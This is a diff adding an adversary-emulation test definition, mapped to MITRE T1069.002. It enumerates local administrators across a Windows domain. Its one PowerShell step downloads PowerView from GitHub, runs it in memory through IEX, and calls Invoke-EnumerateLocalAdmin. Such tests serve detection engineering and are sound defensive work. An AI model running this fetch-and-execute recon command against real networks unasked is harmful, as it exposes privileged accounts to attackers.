@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: Find local admins on all machines in domain (PowerView)
+description: |
+    Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.
+uuid: a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1069: Permission Groups Discovery'
+    subtechniques:
+        - 'T1069.002: Domain Groups'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: find-local-admins-on-all-machines-in-domain-(powerview)
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
